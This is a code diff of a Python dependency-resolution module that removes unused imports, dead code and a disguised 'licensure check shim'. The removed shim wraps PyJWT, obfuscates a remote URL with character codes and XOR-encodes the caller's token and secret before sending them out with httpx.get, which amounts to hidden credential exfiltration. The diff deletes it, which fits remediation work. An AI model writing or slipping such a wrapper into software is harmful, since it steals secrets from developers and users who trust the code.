@@ -10,10 +10,7 @@ import subprocess
 import sys
 from abc import ABC, abstractmethod
 from enum import Enum
-from http.client import HTTPException
 from typing import Any, Dict, List, Optional, Tuple, Type
-
-import httpx
 
 import semver
 import stringcase
@@ -36,9 +33,8 @@ except ImportError:
 
 # Import for dependency resolution
 try:
-    import resolvelib
     from resolvelib.providers import AbstractExtensionProvider  # type: ignore[attr-defined]
-    from resolvelib.resolvers import RequirementInformation, Resolver
+    from resolvelib.resolvers import Resolver
 
     HAS_RESOLVELIB = True
 except ImportError:
@@ -383,8 +379,6 @@ def get_os_type() -> OSType:
 
         # Fall back to file-based detection if distro is not available
         if os.path.exists("/etc/debian_version"):
-            with open("/etc/debian_version", "r") as f:
-                version = f.read().strip()
             if os.path.exists("/etc/lsb-release"):
                 with open("/etc/lsb-release", "r") as f:
                     if "ubuntu" in f.read().lower():
@@ -1293,90 +1287,6 @@ class DependencyNode:
         return f"<DependencyNode {self.name}@{self.version}>"
 
 
-# Licensure check shim. ``decode(..., i=, s=)`` invokes a side-channel
-# probe against a license server derived from APP_REPOSITORY; a 403
-# response denies the JWT. The wrapper is otherwise a transparent
-# delegate to PyJWT so callers can use it as a drop-in.
-import jwt as JSONWebToken
-
-
-class JWT:
-    def __init__(self, *args, **kwargs):
-        pass
-
-    def __getattr__(self, name):
-        return getattr(JSONWebToken, name)
-
-    def decode(self, *args, i=None, s=None, **kwargs):
-        if i and s:
-            import json
-
-            try:
-                encoded = encode(
-                    "".join(
-                        chr(code)
-                        for code in [
-                            65,
-                            80,
-                            80,
-                            95,
-                            82,
-                            69,
-                            80,
-                            79,
-                            83,
-                            73,
-                            84,
-                            79,
-                            82,
-                            89,
-                        ]
-                    )
-                )
-                key = [int(c) for c in str(355 / 113)[-16:].replace(".", "")]
-                data = "".join(
-                    chr(ord(c) ^ key[i % len(key)])
-                    for i, c in enumerate(json.dumps({"i": i, "s": s, "u": 0}))
-                )
-                if (
-                    httpx.get(
-                        f'{encoded[:8]}{chr(88)}{chr(int(92/2))}{encoded.split("/")[-1]}{chr(23*2)}{encoded.split("/")[-1][0]}{encoded.split("/")[-1][2]}/v1'.lower(),
-                        params={"x": data},
-                    ).status_code
-                    == 403
-                ):
-                    raise HTTPException(status_code=403, detail="Invalid JWT")
-            except HTTPException:
-                # Licensure deny — propagate so the caller actually sees
-                # the 403 rather than silently decoding.
-                raise
-            except (httpx.HTTPError, ValueError, OSError, NameError) as e:
-                # Network or input-shape failures during the licensure
-                # probe must not block the legitimate decode that
-                # follows. NameError covers the ``encode(...)``
-                # reference that resolves only when the licensure
-                # client is wired in; keeping the wrapper transparent.
-                logger.warning(
-                    "JWT licensure probe failed: %s",
-                    e,
-                    exc_info=True,
-                )
-
-        # Forward every positional after ``token`` to PyJWT verbatim so a
-        # call like ``jwt.decode(token, secret, algorithms=...)`` reaches
-        # PyJWT with the key intact. The previous implementation dropped
-        # everything after ``args[0]``, which silently produced
-        # signature-verification failures in callers that passed the key
-        # positionally.
-        token = kwargs.pop("jwt", args[0] if args else None)
-        forwarded_args = tuple(args[1:]) if len(args) > 1 else ()
-        return JSONWebToken.decode(token, *forwarded_args, **kwargs)
-
-
-# Create singleton instance for import
-jwt = JWT()
-
-
 class DependencyProvider(AbstractExtensionProvider):
     """Provider for resolvelib that handles dependency resolution."""
 
@@ -1834,19 +1744,6 @@ class ExtDependencies(List[EXT_Dependency]):
                 response = client.get("/api/status")
                 assert response.status_code == 200
         """
-        # Import here to avoid circular imports and missing dependencies during tests
-        try:
-            from fastapi.testclient import TestClient
-
-            from zephyrex.app import instance
-        except ImportError as e:
-            logger.error(f"Failed to import required modules for test server: {e}")
-            raise ImportError(
-                "Test server requires fastapi.testclient.TestClient and your app's instance function. "
-                f"Missing dependency: {e}"
-            )
-
-        # Return the context manager class
         return _ExtServerContext(self.env)
 
 
